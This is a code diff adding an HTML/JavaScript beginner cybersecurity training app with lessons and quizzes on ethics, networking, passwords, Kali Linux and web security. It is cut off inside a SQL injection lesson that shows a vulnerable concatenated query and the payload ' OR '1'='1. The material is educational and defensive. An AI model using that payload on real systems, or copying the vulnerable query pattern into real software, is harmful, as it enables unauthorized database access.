+          <label for="ip-decimal">Decimal IP (e.g., 192.168.1.1)</label>
+          <input id="ip-decimal" placeholder="192.168.1.1">
+        </div>
+        <button class="btn btn-sm btn-primary" id="btn-ip-to-bin">Convert to Binary →</button>
+        <div id="ip-bin-result" class="example-box mt-md hidden"></div>
+        <div class="input-group mt-lg">
+          <label for="ip-binary">Binary IP (e.g., 11000000.10101000.00000001.00000001)</label>
+          <input id="ip-binary" placeholder="11000000.10101000.00000001.00000001">
+        </div>
+        <button class="btn btn-sm btn-secondary" id="btn-bin-to-ip">← Convert to Decimal</button>
+        <div id="bin-ip-result" class="example-box mt-md hidden"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════
+     NEWS PAGE
+     ═══════════════════════════════════════════ -->
+<div id="page-news" class="hidden">
+  <div class="container">
+    <div class="section-head">
+      <div><div class="eyebrow">STAY INFORMED</div><h2>📰 Cyber Attack News</h2></div>
+      <span class="text-muted" style="font-size:.85rem">Updates refresh daily — <span id="news-date"></span></span>
+    </div>
+    <div class="info-box mb-lg">These are educational examples based on real-world attack patterns. Stay aware, stay protected.</div>
+    <div class="news-grid" id="news-grid"></div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════
+     PROFILE PAGE
+     ═══════════════════════════════════════════ -->
+<div id="page-profile" class="hidden">
+  <div class="container">
+    <div class="eyebrow">YOUR CYBER IDENTITY</div>
+    <div class="panel mt-md">
+      <div class="profile-header">
+        <div class="profile-avatar" id="profile-avatar">?</div>
+        <div class="profile-info">
+          <h2 id="profile-name">Agent</h2>
+          <p class="text-muted" id="profile-meta">Beginner · Age: —</p>
+          <div class="chip chip-green mt-sm" id="profile-rank">Recruit</div>
+        </div>
+      </div>
+      <div class="profile-stats" id="profile-stats"></div>
+    </div>
+
+    <div class="section-head mt-xl"><div><div class="eyebrow">ACHIEVEMENTS</div><h2>Your Badges</h2></div></div>
+    <div class="badges-grid" id="profile-badges"></div>
+
+    <div class="section-head mt-xl"><div><div class="eyebrow">ACTIVITY LOG</div><h2>Recent Actions</h2></div></div>
+    <div class="panel" id="activity-log"><p class="text-muted">No activities recorded yet.</p></div>
+
+    <div class="panel mt-xl">
+      <h3 class="mb-md">⚙️ Settings</h3>
+      <button class="btn btn-danger" id="btn-reset">🗑️ Reset All Progress</button>
+      <p class="text-muted mt-sm" style="font-size:.8rem">This clears all saved data from this browser.</p>
+    </div>
+  </div>
+</div>
+
+<!-- SECURITY LOCK OVERLAY -->
+<div id="security-lock" class="security-lock hidden" aria-modal="true" role="dialog" aria-labelledby="security-lock-title">
+  <div class="security-lock-card">
+    <div class="security-lock-icon">🔐</div>
+    <h2 id="security-lock-title">Academy Locked</h2>
+    <p>Enter your security code to continue. The learning app remains locked until verification succeeds.</p>
+    <form id="security-lock-form" autocomplete="off">
+      <input id="security-code" class="security-code" type="password" inputmode="text" autocomplete="off" spellcheck="false" maxlength="64" placeholder="Enter security code" aria-label="Security code" required>
+      <div id="security-status" class="security-status">Protected local session</div>
+      <button class="btn btn-primary btn-block" type="submit">🔓 Unlock Academy</button>
+    </form>
+    <div class="security-lock-meta">Client-side protection only • Do not use this as a replacement for server-side authentication.</div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════
+     FOOTER
+     ═══════════════════════════════════════════ -->
+<footer id="main-footer" class="hidden">
+  <div class="container">
+    <div class="footer-brand"><span class="dot">⬡</span> iHack<span class="text-green">.com</span></div>
+    <p>Think like a hacker. Defend like a guardian. Always get permission.</p>
+    <p class="creator mt-sm">Created by AB</p>
+  </div>
+</footer>
+
+<!-- ═══════════════════════════════════════════
+     AI BOT
+     ═══════════════════════════════════════════ -->
+<button class="bot-toggle hidden" id="bot-toggle" title="AI Helper Bot">🤖</button>
+<div class="bot-panel hidden" id="bot-panel">
+  <div class="bot-header">
+    <h4>🤖 CyberBot — Learning Assistant</h4>
+    <button style="background:none;color:var(--muted);font-size:1.2rem" id="bot-close">✕</button>
+  </div>
+  <div class="bot-messages" id="bot-messages"></div>
+  <div class="bot-input">
+    <input id="bot-input" placeholder="Ask me anything about cybersecurity…" maxlength="300">
+    <button id="bot-send">Send</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     JAVASCRIPT — ALL DATA, LOGIC & INTERACTIVITY
+     ═══════════════════════════════════════════════════════════════ -->
+<script>
+"use strict";
+
+/* ─── UTILITY ─── */
+const $=id=>document.getElementById(id);
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+let toastT;
+function toast(msg,err){const t=$('toast');t.textContent=msg;t.className=err?'error':'';t.classList.add('show');clearTimeout(toastT);toastT=setTimeout(()=>t.classList.remove('show'),3500)}
+
+/* ─── PARTICLES ─── */
+(function(){const c=$('bg-canvas');const colors=['#00ff8840','#00b4ff30','#a855f720','#22d3ee25'];for(let i=0;i<40;i++){const p=document.createElement('div');p.className='particle';const s=Math.random()*6+2;p.style.cssText=`width:${s}px;height:${s}px;left:${Math.random()*100}%;background:${colors[i%4]};animation-duration:${Math.random()*20+15}s;animation-delay:${Math.random()*20}s`;c.appendChild(p)}})();
+
+/* ═══════════════════════════════════════════
+   CONTENT DATABASE
+   ═══════════════════════════════════════════ */
+
+const MISSIONS=[
+/* 0 */ {id:"intro",icon:"🛡️",title:"Introduction to Cybersecurity",sub:"What is cybersecurity and why it matters",diff:"beginner",xp:50,
+topics:[
+{title:"What is Cybersecurity?",
+content:`<p>Cybersecurity is the practice of protecting systems, networks, and data from digital threats, attacks, and unauthorized access. As our world becomes more connected, cybersecurity has become essential to safeguard personal, corporate, and government information.</p>
+<h3>Key Concepts</h3>
+<ul>
+<li><strong>Data Protection:</strong> Safeguarding sensitive information from unauthorized access.</li>
+<li><strong>Network Security:</strong> Protecting the integrity and confidentiality of data transmitted over a network.</li>
+<li><strong>Application Security:</strong> Ensuring software applications are secure from vulnerabilities.</li>
+<li><strong>Endpoint Security:</strong> Securing devices like computers, smartphones, and tablets.</li>
+<li><strong>Identity Management:</strong> Managing user identities and authentication to prevent unauthorized access.</li>
+<li><strong>Incident Response:</strong> Preparing for and responding to cybersecurity breaches.</li>
+</ul>
+<h3>The CIA Triad</h3>
+<div class="info-box"><strong>CIA</strong> stands for <strong>Confidentiality, Integrity, and Availability</strong> — the three pillars of information security.</div>
+<ul>
+<li><strong>Confidentiality:</strong> Ensuring that information is accessible only to authorized users. Measures include encryption, strong passwords, two-factor authentication, and biometric verification.</li>
+<li><strong>Integrity:</strong> Protecting information from being modified by unauthorized parties. Measures include file permissions, hashing, and digital signatures.</li>
+<li><strong>Availability:</strong> Making sure that authorized parties can access information when needed. Measures include backups, redundancy, and disaster recovery plans.</li>
+</ul>`,
+quiz:[
+{q:"What does CIA stand for in cybersecurity?",opts:["Central Intelligence Agency","Confidentiality, Integrity, Availability","Cyber Intelligence Application"],a:1,hint:"Think about the three pillars of information security."},
+{q:"Which CIA pillar ensures only authorized users can access data?",opts:["Integrity","Availability","Confidentiality"],a:2,hint:"It's about keeping secrets from unauthorized eyes."}
+]},
+{title:"Importance of Cybersecurity",
+content:`<h3>Why Cybersecurity Matters</h3>
+<ul>
+<li><strong>Protecting Sensitive Data:</strong> Personal information, financial data, and intellectual property need protection from theft and exposure.</li>
+<li><strong>Maintaining Privacy:</strong> Cybersecurity ensures that individuals' privacy is maintained and prevents unauthorized entities from accessing personal data.</li>
+<li><strong>Preventing Financial Loss:</strong> Cyberattacks can result in significant financial losses for individuals and organizations.</li>
+<li><strong>Ensuring Business Continuity:</strong> A cyberattack or data breach can disrupt operations, leading to downtime and damage to reputation.</li>
+<li><strong>Compliance with Laws:</strong> Many industries are subject to strict regulatory frameworks that mandate data protection (GDPR, HIPAA, etc).</li>
+<li><strong>National Security:</strong> Cyberattacks can target government agencies, critical infrastructure like power grids, transportation systems, and healthcare networks.</li>
+</ul>
+<h3>Common Cyber Threats</h3>
+<ul>
+<li><strong>Malware:</strong> Malicious software designed to damage, disrupt, or gain unauthorized access. Includes viruses, worms, trojans, and ransomware.</li>
+<li><strong>Phishing:</strong> Deceptive messages designed to trick people into revealing sensitive information.</li>
+<li><strong>Password Attacks:</strong> Attempts to crack or steal passwords through brute force, dictionary attacks, or credential stuffing.</li>
+<li><strong>Man-in-the-Middle (MitM):</strong> Intercepting communication between two parties.</li>
+<li><strong>Drive-by Attacks:</strong> Malware automatically downloaded when visiting a compromised website.</li>
+<li><strong>SQL Injection:</strong> Exploiting vulnerabilities in web applications to access databases.</li>
+<li><strong>DDoS Attacks:</strong> Overwhelming a service with traffic to make it unavailable.</li>
+<li><strong>Insider Threats:</strong> Employees or trusted individuals who compromise security from within.</li>
+<li><strong>Advanced Persistent Threats (APTs):</strong> Sophisticated, prolonged attacks targeting specific organizations.</li>
+</ul>`,
+quiz:[
+{q:"Which attack overwhelms a server with traffic to make it unavailable?",opts:["Phishing","SQL Injection","DDoS Attack"],a:2,hint:"It involves flooding a target with requests."},
+{q:"What type of malware encrypts your files and demands payment?",opts:["Virus","Ransomware","Adware"],a:1,hint:"Think about what 'ransom' means."}
+]}
+]},
+
+/* 1 */ {id:"ethics",icon:"⚖️",title:"The Ethical Hacker",sub:"Permission, scope, and the defender mindset",diff:"beginner",xp:50,
+topics:[
+{title:"What is Ethical Hacking?",
+content:`<p>An ethical hacker (also called a white-hat hacker) is a cybersecurity professional who tests systems for vulnerabilities <strong>with explicit permission</strong> from the owner.</p>
+<h3>Types of Hackers</h3>
+<ul>
+<li><strong>White Hat:</strong> Ethical hackers who help organizations find and fix security flaws. They always work with authorization.</li>
+<li><strong>Black Hat:</strong> Malicious hackers who exploit systems illegally for personal gain or to cause harm.</li>
+<li><strong>Grey Hat:</strong> Hackers who may find vulnerabilities without permission but don't have malicious intent. Still potentially illegal.</li>
+</ul>
+<h3>The Rules of Ethical Hacking</h3>
+<ol>
+<li><strong>Get Authorization:</strong> Always obtain explicit written permission before testing any system.</li>
+<li><strong>Define Scope:</strong> Agree on what systems can be tested, what methods are allowed, and what's off-limits.</li>
+<li><strong>Minimize Harm:</strong> Avoid disruption and unnecessary access to data. Stop if you encounter sensitive data outside scope.</li>
+<li><strong>Report Responsibly:</strong> Share findings privately with the owner and help verify fixes.</li>
+<li><strong>Follow the Law:</strong> Ethical hacking must comply with local and international laws.</li>
+</ol>
+<div class="info-box warn"><strong>⚠️ Important:</strong> A public website is NOT authorization to test. A bug bounty program only permits what its published policy allows.</div>`,
+quiz:[
+{q:"Can you security-test a public website without permission?",opts:["Yes, it's public","No, public access is not authorization","Yes, if you don't change anything"],a:1,hint:"Think about the difference between access and authorization."},
+{q:"What should you do if you find customer data outside your test scope?",opts:["Download it as proof","Stop and notify the agreed contact","Share it with other testers"],a:1,hint:"Respect the scope boundaries."}
+]},
+{title:"Cybersecurity Career Paths",
+content:`<h3>Career Paths in Cybersecurity</h3>
+<ul>
+<li><strong>Security Analyst:</strong> Monitors networks and systems for signs of security breaches.</li>
+<li><strong>Penetration Tester:</strong> Authorized to simulate cyberattacks on systems to identify vulnerabilities.</li>
+<li><strong>Incident Responder:</strong> Manages the aftermath of cybersecurity attacks. Identifies, contains, and recovers from incidents.</li>
+<li><strong>Security Engineer:</strong> Designs and implements security solutions including firewalls, VPNs, and IDS.</li>
+<li><strong>Cloud Security Specialist:</strong> Responsible for securing applications and data in cloud platforms.</li>
+<li><strong>Cybersecurity Consultant:</strong> Advises organizations on best practices for security.</li>
+<li><strong>Malware Analyst:</strong> Studies malicious software to understand how it works and how to defend against it.</li>
+<li><strong>Chief Information Security Officer (CISO):</strong> Oversees the entire cybersecurity strategy of an organization.</li>
+<li><strong>Cyber Security Trainer/Educator:</strong> Teaches cybersecurity concepts, tools, and practices.</li>
+<li><strong>Forensic Expert:</strong> Investigates cyber crimes and recovers evidence for legal proceedings.</li>
+</ul>
+<div class="info-box"><strong>Skills needed across roles:</strong> Networking knowledge, programming ability, understanding of operating systems, analytical thinking, continuous learning, and strong ethics.</div>`,
+quiz:[
+{q:"What does a Penetration Tester do?",opts:["Monitors network traffic","Simulates authorized cyberattacks to find vulnerabilities","Designs firewalls"],a:1,hint:"Think about 'penetrating' defenses with permission."},
+{q:"Who oversees an organization's entire cybersecurity strategy?",opts:["Security Analyst","CISO","Malware Analyst"],a:1,hint:"It's a C-level executive role."}
+]}
+]},
+
+/* 2 */ {id:"network",icon:"🌐",title:"Networking Fundamentals",sub:"Networks, devices, IP addresses, and topologies",diff:"beginner",xp:60,
+topics:[
+{title:"Types of Networks",
+content:`<h3>What is a Network?</h3>
+<p>A network is a system of interconnected devices (computers, servers, routers, switches, etc.) that share resources, information, and data with each other through wired or wireless connections.</p>
+<h3>Types of Networks</h3>
+<ul>
+<li><strong>LAN (Local Area Network):</strong> Connects computers and devices within a small geographic area like a building or office. Allows devices to share resources like files, printers, and applications.</li>
+<li><strong>WAN (Wide Area Network):</strong> Spans a much larger geographical area, often connecting multiple LANs across cities, countries, or continents. The Internet itself is a massive WAN.</li>
+<li><strong>MAN (Metropolitan Area Network):</strong> Covers a larger area than a LAN but smaller than a WAN, often used to connect businesses, schools, and government offices within a city or metropolitan area.</li>
+<li><strong>PAN (Personal Area Network):</strong> A small network typically used for connecting personal devices within a few meters (e.g., connecting a smartphone to a wireless Bluetooth speaker).</li>
+</ul>
+<div class="example-box"><strong>Example:</strong> Your home Wi-Fi is a LAN. Your company connecting offices in different cities uses a WAN. A city's government network connecting hospitals, schools, and offices is a MAN.</div>`,
+quiz:[
+{q:"What type of network connects devices in a small area like an office?",opts:["WAN","LAN","MAN"],a:1,hint:"Think 'Local'."},
+{q:"The Internet itself is an example of which network type?",opts:["LAN","PAN","WAN"],a:2,hint:"It spans the entire world — very 'Wide'."}
+]},
+{title:"Networking Devices",
+content:`<h3>Key Networking Devices</h3>
+<ul>
+<li><strong>Router:</strong> Connects different networks and forwards data packets between them. Uses IP addresses to determine the best path for data. Your home Wi-Fi router connects your home network to the internet.</li>
+<li><strong>Switch:</strong> Operates within a LAN. Uses MAC (Media Access Control) addresses to forward data only to the specific device it's intended for, making it more efficient than a hub.</li>
+<li><strong>Hub:</strong> An older, simpler device that broadcasts data to all connected devices. Less efficient because all devices receive all data, not just the intended recipient. Largely replaced by switches.</li>
+<li><strong>Modem:</strong> Converts analog signals from your ISP (Internet Service Provider) into digital signals your devices can use, and vice versa.</li>
+</ul>
+<h3>Hub vs Switch</h3>
+<div class="table-wrap"><table>
+<tr><th>Feature</th><th>Hub</th><th>Switch</th></tr>
+<tr><td>Data Handling</td><td>Broadcasts to all devices</td><td>Forwards to specific device</td></tr>
+<tr><td>Intelligence</td><td>No address learning</td><td>Learns MAC addresses</td></tr>
+<tr><td>Efficiency</td><td>Low (shared bandwidth)</td><td>High (dedicated bandwidth)</td></tr>
+<tr><td>Speed</td><td>Slower (all share)</td><td>Faster (direct paths)</td></tr>
+<tr><td>OSI Layer</td><td>Layer 1 (Physical)</td><td>Layer 2 (Data Link)</td></tr>
+</table></div>
+<h3>Modem vs Router</h3>
+<div class="table-wrap"><table>
+<tr><th>Feature</th><th>Modem</th><th>Router</th></tr>
+<tr><td>Function</td><td>Converts ISP signals</td><td>Connects multiple devices</td></tr>
+<tr><td>Network Type</td><td>Provides internet access</td><td>Creates local network (LAN)</td></tr>
+<tr><td>IP Address</td><td>Provides single public IP</td><td>Assigns private IPs to devices</td></tr>
+<tr><td>Wi-Fi</td><td>Does not provide Wi-Fi (usually)</td><td>Provides Wi-Fi to devices</td></tr>
+</table></div>`,
+quiz:[
+{q:"Which device forwards data only to the intended recipient using MAC addresses?",opts:["Hub","Router","Switch"],a:2,hint:"It's smarter than a hub."},
+{q:"What does a modem do?",opts:["Creates a local network","Converts ISP signals for your devices","Assigns IP addresses"],a:1,hint:"It's the bridge between your ISP and your home network."}
+]},
+{title:"IP Addresses & Classes",
+content:`<h3>What is an IP Address?</h3>
+<p>An IP (Internet Protocol) address is a unique numerical label assigned to every device connected to a network. It serves two purposes: identifying the host/device and providing the location for communication.</p>
+<h3>IPv4 Format</h3>
+<p>IPv4 uses 32 bits divided into 4 octets (each 0-255), separated by dots. Example: <code>192.168.1.1</code></p>
+<h3>IP Address Classes (Classful Addressing)</h3>
+<div class="table-wrap"><table>
+<tr><th>Class</th><th>First Octet Range</th><th>Default Subnet Mask</th><th>Purpose</th></tr>
+<tr><td><strong>A</strong></td><td>1–126</td><td><code>255.0.0.0</code> or /8</td><td>Very large networks</td></tr>
+<tr><td><strong>B</strong></td><td>128–191</td><td><code>255.255.0.0</code> or /16</td><td>Medium-sized networks</td></tr>
+<tr><td><strong>C</strong></td><td>192–223</td><td><code>255.255.255.0</code> or /24</td><td>Small networks</td></tr>
+<tr><td><strong>D</strong></td><td>224–239</td><td>N/A</td><td>Multicast</td></tr>
+<tr><td><strong>E</strong></td><td>240–255</td><td>N/A</td><td>Experimental/reserved</td></tr>
+</table></div>
+<h3>Binary to Decimal Conversion</h3>
+<p>Each octet is 8 bits. The binary value <code>11000000</code> = 128+64 = <strong>192</strong></p>
+<div class="example-box"><strong>Example:</strong> IP <code>192.168.1.1</code> in binary:<br>
+<code>11000000.10101000.00000001.00000001</code><br><br>
+Each position has a value: 128, 64, 32, 16, 8, 4, 2, 1<br>
+192 = 128+64 = <code>11000000</code><br>
+168 = 128+32+8 = <code>10101000</code></div>
+<h3>How to Find an IP Address of a Website</h3>
+<p>On any system with a terminal or command prompt:</p>
+<ul>
+<li>Windows: <code>nslookup example.com</code> or <code>ping example.com</code></li>
+<li>Linux/Mac: <code>dig example.com</code> or <code>host example.com</code></li>
+</ul>
+<div class="info-box warn"><strong>Note:</strong> Only look up domains you own or have authorization to investigate. Looking up an IP is not authorization to scan or test.</div>`,
+quiz:[
+{q:"What class does IP address 172.16.0.1 belong to?",opts:["Class A","Class B","Class C"],a:1,hint:"Check the first octet range: 128-191."},
+{q:"What is 192 in binary?",opts:["11000000","10110000","11100000"],a:0,hint:"192 = 128 + 64. Which positions are 'on'?"},
+{q:"How many bits are in an IPv4 address?",opts:["16","32","64"],a:1,hint:"4 octets × 8 bits each."}
+]},
+{title:"Network Topologies",
+content:`<h3>What is Network Topology?</h3>
+<p>Network topology refers to the arrangement or layout of devices and connections in a network. Physical topology describes physical connections; logical topology describes how data flows.</p>
+<h3>Types of Topologies</h3>
+<ul>
+<li><strong>Bus Topology:</strong> All devices connect to a single central cable (the bus). Simple and inexpensive for small networks, but a cable failure can bring down the entire network.</li>
+<li><strong>Star Topology:</strong> All devices connect to a central hub or switch. Most common in modern networks. If one connection fails, only that device is affected, but the central device is a single point of failure.</li>
+<li><strong>Ring Topology:</strong> Each device connects to exactly two other devices, forming a circle. Data travels in one direction. A single break can disrupt the entire network.</li>
+<li><strong>Mesh Topology:</strong> Every device connects to every other device. Highly reliable (many redundant paths), but expensive and complex. Used in critical infrastructure.</li>
+<li><strong>Tree (Hierarchical) Topology:</strong> Combination of star and bus topologies. Devices are arranged in a hierarchy. Common in large organizations.</li>
+<li><strong>Hybrid Topology:</strong> Combination of two or more topologies. Flexible and scalable but complex to design.</li>
+</ul>
+<div class="table-wrap"><table>
+<tr><th>Topology</th><th>Advantages</th><th>Disadvantages</th></tr>
+<tr><td>Bus</td><td>Simple, cheap, easy setup</td><td>Single cable failure = network down</td></tr>
+<tr><td>Star</td><td>Easy to add devices, isolated failures</td><td>Central device failure = network down</td></tr>
+<tr><td>Ring</td><td>Equal access, predictable performance</td><td>One break = entire network affected</td></tr>
+<tr><td>Mesh</td><td>Highly reliable, redundant</td><td>Expensive, complex</td></tr>
+<tr><td>Tree</td><td>Scalable, hierarchical</td><td>Central backbone failure critical</td></tr>
+</table></div>`,
+quiz:[
+{q:"Which topology connects every device to a central hub or switch?",opts:["Bus","Star","Mesh"],a:1,hint:"Think of a star shape with the hub at the center."},
+{q:"Which topology is most expensive but most reliable?",opts:["Bus","Ring","Mesh"],a:2,hint:"Every device connects to every other device."}
+]}
+]},
+
+/* 3 */ {id:"threats",icon:"🎯",title:"Identifying Threats",sub:"Recognize and classify cyber threats",diff:"beginner",xp:50,
+topics:[
+{title:"Types of Cyber Attacks",
+content:`<h3>Common Attack Types</h3>
+<ul>
+<li><strong>Phishing:</strong> Deceptive emails/messages that trick users into revealing sensitive information. Look for urgency, suspicious sender addresses, and requests for credentials.</li>
+<li><strong>Malware:</strong> Software designed to damage or gain unauthorized access. Types include:
+  <ul>
+    <li><em>Virus:</em> Attaches to legitimate programs and spreads when executed</li>
+    <li><em>Worm:</em> Self-replicating malware that spreads without user interaction</li>
+    <li><em>Trojan:</em> Disguises as legitimate software</li>
+    <li><em>Ransomware:</em> Encrypts files and demands payment</li>
+    <li><em>Spyware:</em> Monitors user activity secretly</li>
+  </ul>
+</li>
+<li><strong>Social Engineering:</strong> Manipulating people to bypass security controls. Includes pretexting, baiting, and tailgating.</li>
+<li><strong>DDoS (Distributed Denial of Service):</strong> Overwhelming a target with traffic from multiple sources.</li>
+<li><strong>Man-in-the-Middle (MitM):</strong> Intercepting communication between two parties without their knowledge.</li>
+<li><strong>SQL Injection:</strong> Inserting malicious SQL code into web application inputs to manipulate databases.</li>
+<li><strong>Cross-Site Scripting (XSS):</strong> Injecting malicious scripts into web pages viewed by other users.</li>
+<li><strong>Brute Force:</strong> Systematically trying all possible passwords until the correct one is found.</li>
+</ul>
+<h3>How to Identify Threats</h3>
+<ul>
+<li>Unexpected emails asking for personal information or containing urgent language</li>
+<li>Unusual system behavior — slowdowns, crashes, or unexpected popups</li>
+<li>Unknown programs running on your computer</li>
+<li>Unusual network activity or data transfers</li>
+<li>Login attempts from unfamiliar locations</li>
+<li>Files that have been changed, encrypted, or deleted without your knowledge</li>
+</ul>
+<div class="info-box"><strong>Remember:</strong> HTTPS and professional-looking websites do NOT guarantee safety. Attackers can create convincing fake sites with valid certificates.</div>`,
+quiz:[
+{q:"Which attack tricks users through deceptive emails to steal credentials?",opts:["DDoS","Phishing","Brute Force"],a:1,hint:"Think about 'fishing' for information."},
+{q:"What is malware that encrypts your files and demands payment called?",opts:["Spyware","Trojan","Ransomware"],a:2,hint:"The attacker demands a 'ransom'."},
+{q:"Which attack intercepts communication between two parties?",opts:["XSS","Man-in-the-Middle","SQL Injection"],a:1,hint:"The attacker positions themselves 'in the middle'."}
+]}
+]},
+
+/* 4 */ {id:"passwords",icon:"🔑",title:"Password & Authentication",sub:"Strong passwords, MFA, and passkeys",diff:"beginner",xp:50,
+topics:[
+{title:"Account Security",
+content:`<h3>Password Best Practices</h3>
+<ul>
+<li><strong>Length:</strong> Use at least 12-16 characters. Longer passwords are exponentially harder to crack.</li>
+<li><strong>Uniqueness:</strong> Never reuse passwords across different accounts. If one service is breached, all accounts with the same password are compromised.</li>
+<li><strong>Randomness:</strong> Use a password manager to generate truly random passwords. Common words and patterns are easily guessed.</li>
+<li><strong>Avoid:</strong> Personal information, dictionary words, common substitutions (p@ssw0rd), and keyboard patterns (qwerty).</li>
+</ul>
+<h3>Multi-Factor Authentication (MFA)</h3>
+<p>MFA adds additional verification beyond just a password. The three factors are:</p>
+<ul>
+<li><strong>Something you know:</strong> Password, PIN</li>
+<li><strong>Something you have:</strong> Phone, hardware security key, smart card</li>
+<li><strong>Something you are:</strong> Fingerprint, face recognition, iris scan</li>
+</ul>
+<div class="info-box"><strong>Two passwords are NOT two-factor authentication.</strong> True MFA uses different types of factors.</div>
+<h3>Passkeys</h3>
+<p>Passkeys use public-key cryptography for phishing-resistant sign-in. Your device stores a private key that never leaves it, while the service stores only the public key.</p>
+<h3>Password Managers</h3>
+<p>A password manager generates, stores, and auto-fills strong unique passwords for every account. Protect your password manager with a strong master password and MFA.</p>`,
+quiz:[
+{q:"What is the best password strategy?",opts:["One strong password everywhere","Unique random passwords in a password manager","Your birthday with special characters"],a:1,hint:"Uniqueness prevents chain-reaction breaches."},
+{q:"Which combination represents true multi-factor authentication?",opts:["Two passwords","A password and a security key","Username and email"],a:1,hint:"Different types of factors: something you know + something you have."}
+]}
+]},
+
+/* 5 */ {id:"cisco",icon:"📡",title:"Cisco Packet Tracer",sub:"Why and how to use Cisco Packet Tracer",diff:"intermediate",xp:60,
+topics:[
+{title:"Why Use Cisco Packet Tracer?",
+content:`<h3>What is Cisco Packet Tracer?</h3>
+<p>Cisco Packet Tracer is a free network simulation tool created by Cisco Systems. It allows you to design, build, configure, and troubleshoot computer networks in a safe virtual environment.</p>
+<h3>Why Use It for Learning?</h3>
+<ul>
+<li><strong>Safe Practice:</strong> Build and break networks without affecting real infrastructure.</li>
+<li><strong>Visual Learning:</strong> See network topologies, watch packets travel between devices, and understand data flow.</li>
+<li><strong>Hands-on Experience:</strong> Configure routers, switches, firewalls, and servers using real Cisco IOS commands.</li>
+<li><strong>Free:</strong> Available for download from the Cisco Networking Academy website.</li>
+<li><strong>Exam Preparation:</strong> Widely used for CCNA certification preparation.</li>
+</ul>
+<h3>How to Get Started</h3>
+<ol>
+<li>Visit <strong>netacad.com</strong> and create a free account</li>
+<li>Download Cisco Packet Tracer for your operating system</li>
+<li>Install and sign in with your Netacad credentials</li>
+<li>Start with the built-in tutorials and activity files</li>
+</ol>
+<h3>Basic Steps in Packet Tracer</h3>
+<ol>
+<li><strong>Add devices:</strong> Drag routers, switches, PCs, and servers onto the workspace</li>
+<li><strong>Connect them:</strong> Use appropriate cable types (straight-through, crossover, or console)</li>
+<li><strong>Configure:</strong> Click on devices to access CLI (command-line interface) and configure IP addresses, routing, etc.</li>
+<li><strong>Test:</strong> Use the simulation mode to send packets and watch them travel through the network</li>
+<li><strong>Troubleshoot:</strong> Identify where packets are being dropped and fix configurations</li>
+</ol>
+<div class="example-box"><strong>Example — Setting an IP on a PC:</strong><br>
+Click PC → Desktop tab → IP Configuration<br>
+Set IP: <code>192.168.1.10</code><br>
+Subnet Mask: <code>255.255.255.0</code><br>
+Default Gateway: <code>192.168.1.1</code></div>
+<div class="info-box">Packet Tracer is excellent for understanding how networks work before touching real equipment. Build the habit of <strong>planning before configuring</strong>.</div>`,
+quiz:[
+{q:"What is Cisco Packet Tracer primarily used for?",opts:["Hacking real networks","Simulating and learning network configurations","Editing photos"],a:1,hint:"It's a simulation tool for learning."},
+{q:"What cable connects a PC directly to a switch in Packet Tracer?",opts:["Crossover cable","Console cable","Straight-through cable"],a:2,hint:"Different devices use straight-through cables."}
+]}
+]},
+
+/* 6 */ {id:"kali",icon:"🐉",title:"Kali Linux Basics",sub:"Introduction to Kali Linux and essential commands",diff:"intermediate",xp:60,
+topics:[
+{title:"What is Kali Linux?",
+content:`<h3>Introduction to Kali Linux</h3>
+<p>Kali Linux is a Debian-based Linux distribution specifically designed for cybersecurity professionals and ethical hackers. It comes pre-installed with hundreds of security tools for penetration testing, forensics, and security research.</p>
+<div class="info-box warn"><strong>⚠️ Legal Warning:</strong> Kali Linux tools must ONLY be used on systems you own or have explicit written permission to test. Unauthorized use is illegal.</div>
+<h3>Essential Linux Commands</h3>
+<div class="table-wrap"><table>
+<tr><th>Command</th><th>Description</th><th>Example</th></tr>
+<tr><td><code>pwd</code></td><td>Print working directory</td><td><code>pwd</code> → /home/user</td></tr>
+<tr><td><code>ls</code></td><td>List directory contents</td><td><code>ls -la</code> (detailed list)</td></tr>
+<tr><td><code>cd</code></td><td>Change directory</td><td><code>cd /home/user/Documents</code></td></tr>
+<tr><td><code>mkdir</code></td><td>Create a directory</td><td><code>mkdir my_folder</code></td></tr>
+<tr><td><code>cp</code></td><td>Copy files</td><td><code>cp file.txt backup.txt</code></td></tr>
+<tr><td><code>mv</code></td><td>Move/rename files</td><td><code>mv old.txt new.txt</code></td></tr>
+<tr><td><code>rm</code></td><td>Remove files</td><td><code>rm file.txt</code></td></tr>
+<tr><td><code>cat</code></td><td>Display file contents</td><td><code>cat notes.txt</code></td></tr>
+<tr><td><code>chmod</code></td><td>Change file permissions</td><td><code>chmod 755 script.sh</code></td></tr>
+<tr><td><code>ifconfig</code></td><td>Show network interfaces</td><td><code>ifconfig eth0</code></td></tr>
+<tr><td><code>ping</code></td><td>Test connectivity</td><td><code>ping 192.168.1.1</code></td></tr>
+<tr><td><code>nmap</code></td><td>Network scanner</td><td><code>nmap -sV target</code> (authorized only!)</td></tr>
+<tr><td><code>sudo</code></td><td>Execute as superuser</td><td><code>sudo apt update</code></td></tr>
+</table></div>
+<h3>Getting Started with Kali</h3>
+<ol>
+<li>Download from <strong>kali.org</strong> (ISO or virtual machine image)</li>
+<li>Run in VirtualBox or VMware for safe practice</li>
+<li>Default credentials: <code>kali/kali</code></li>
+<li>Update first: <code>sudo apt update && sudo apt upgrade</code></li>
+<li>Explore tools through the application menu organized by category</li>
+</ol>`,
+quiz:[
+{q:"What command shows your current directory in Linux?",opts:["ls","pwd","cd"],a:1,hint:"'Print Working Directory'."},
+{q:"What must you always have before using Kali Linux security tools on a target?",opts:["A fast internet connection","Explicit written authorization","The latest version of Kali"],a:1,hint:"Rule Zero: get permission first!"},
+{q:"Which command lists files and directories?",opts:["pwd","cat","ls"],a:2,hint:"Think 'list'."}
+]}
+]},
+
+/* 7 */ {id:"web",icon:"🧩",title:"Web Security Basics",sub:"SQL injection, XSS, and secure coding",diff:"intermediate",xp:60,
+topics:[
+{title:"Common Web Vulnerabilities",
+content:`<h3>SQL Injection (SQLi)</h3>
+<p>SQL injection occurs when untrusted input changes the meaning of a database query. Attackers can read, modify, or delete data.</p>
+<div class="example-box"><strong>Vulnerable code:</strong><br>
+<code>query = "SELECT * FROM users WHERE name = '" + userInput + "'"</code><br><br>
+If a user enters: <code>' OR '1'='1</code><br>
+The query becomes: <code>SELECT * FROM users WHERE name = '' OR '1'='1'</code><br>
